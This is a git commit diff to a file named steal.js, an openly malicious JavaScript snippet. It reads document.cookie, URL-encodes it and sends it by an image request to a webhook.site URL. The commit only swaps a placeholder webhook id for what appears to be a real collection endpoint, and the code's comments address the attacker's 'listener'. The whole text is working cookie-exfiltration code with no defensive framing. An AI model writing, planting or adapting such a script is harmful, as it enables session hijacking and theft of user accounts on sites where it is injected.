23017be07243448c3ed995c55b22d8b54cf818ea
Abdennour Chakifi <69427610+Dazaiii1@users.noreply.github.com>
2025-06-13 18:34:00 +0200

    Update steal.js

--- steal.js
+++ steal.js
@@ -3,5 +3,5 @@
   // Read all cookies for the current domain
   const cookies = encodeURIComponent(document.cookie);
   // Send them to your listener
-  new Image().src = 'https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890?c=' + cookies;
+  new Image().src = 'https://webhook.site/9972dee2-e14a-4fbe-8f98-025600525c10?c=' + cookies;
 })();
